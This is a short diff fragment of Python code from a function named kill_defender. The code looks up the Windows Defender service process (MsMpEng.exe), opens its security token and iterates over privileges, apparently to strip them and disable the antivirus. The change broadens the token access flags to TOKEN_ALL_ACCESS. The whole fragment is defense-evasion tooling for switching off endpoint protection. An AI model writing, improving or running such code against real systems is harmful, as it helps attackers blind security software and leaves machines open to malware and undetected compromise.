@@ -118,7 +118,7 @@ def kill_defender():
         SE_ASSIGNPRIMARYTOKEN_NAME,
     ]
     pid = get_pid("MsMpEng.exe")
-    flags = TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY
+    flags = TOKEN_ALL_ACCESS
     proc_handle = win32api.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, pid)
     htoken = win32security.OpenProcessToken(proc_handle, flags)
     for priv in privs:
